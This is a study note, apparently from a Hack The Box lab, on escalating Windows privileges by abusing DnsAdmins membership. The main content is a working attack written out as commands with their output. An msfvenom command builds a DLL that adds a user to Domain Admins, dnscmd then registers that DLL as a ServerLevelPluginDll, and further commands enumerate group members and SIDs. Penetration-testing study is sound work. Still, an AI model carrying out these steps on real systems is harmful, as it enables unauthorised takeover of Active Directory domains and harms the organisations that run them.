#Windows_Privesc 

---

- Members of this group have access to network DNS information

- Membership in the **DNS Admins group** can be leveraged to get root access using the following steps:
	- DNS records are centrally managed via RPC calls
	- **ServerLevelPluginDLL** allows us to load a **DLL** with zero verification using the `dnscmd` command, which we can then use to spawn a reverse shell
	- When a member of the **DNS Admins** group runs the `dnscmd` command the registry key `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` is populated
	- When the DNS service is restarted the **DLL** in this path will be loaded


## Leveraging DnsAdmins Access

- **Generating malicious DLL**: We can generate a malicious DLL using `msfvenom` as follows:
```shell-session
emi2024@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

**Loading DLL as Non-Privileged User**
```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

**Loading DLL as Member of DNSAdmins**

- To retrieve the members of the **DNS Admins** group we use the following command:
```powershell
Get-ADGroupMember -Identity DnsAdmin
```
and we would get something like this:
```powershell-session
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109    
```

=> the output above indicates the netadm user is part of the **DnsAdmins** user

- After confirming that `netadm` is part of the **DnsAdmins** group we can now load the custom **DLL**
```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

- To find a user's SID we use the following command:
```cmd-session
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```


